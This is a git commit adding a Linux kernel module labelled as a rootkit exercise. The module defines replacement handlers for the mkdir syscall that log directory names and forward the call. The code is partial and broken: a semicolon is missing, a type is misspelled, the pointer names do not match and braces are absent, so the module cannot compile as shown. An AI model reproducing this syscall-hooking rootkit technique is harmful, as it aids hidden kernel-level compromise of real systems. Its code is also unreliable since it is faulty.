0ad4df41fdb5901942662c9e364b1a99f047e8ff
L0gic <95774215+baku01@users.noreply.github.com>
2023-05-11 11:51:09 -0300

    new file:   [2] Function Hooking/Hooking.c 	new file:   [2] Function Hooking/Makefile

---
+++ [2] Function Hooking/Hooking.c
@@ -0,0 +1,47 @@
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/syscalls.h>
+#include <linux/version.h>
+#include <linux/namei.h>
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("l0gic");
+MODULE_DESCRIPTION("mkdir syscall hook");
+MODULE_VERSION("0.01");
+
+#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(5,19,0))
+#define PTREGS_SYSCALL_STUBS 1
+#endif
+
+#ifdef PTREGS_SYSCALL_STUBS
+static asmlinkage long (*org_mkdir)(const struct pt_regs *)
+
+asmlinkage int Hook_no_Mkdir(const struct pt_regs *regs)
+{
+    char __user *pathname = (char *) regs->di;
+    char dir_name[NAME_MAX] = {0};
+
+    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
+
+    if (error > 0)
+        printk(KERN_INFO "Root kit: tentou criar o direito com o nome de : %s\n", dir_name);
+        org_mkdir(regs);
+        return 0; 
+}
+#else
+static asmlinkage long (*orig_mkdir)(const char __user *pathname, umode_t mode);
+
+asmlinkage int Hook_no_Mkdir(const char __user *pathname, unomode_t mode)
+{
+    char dir_name[NAME_MAX] = {0};
+
+    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
+
+    if(error > 0)
+        printk(KERN_INFO "Root kit: tentou criar o direito com o nome de : %s\n", dir_name);
+        org_mkdir(pathname, mode);
+        return 0;
+}
+#endif
+
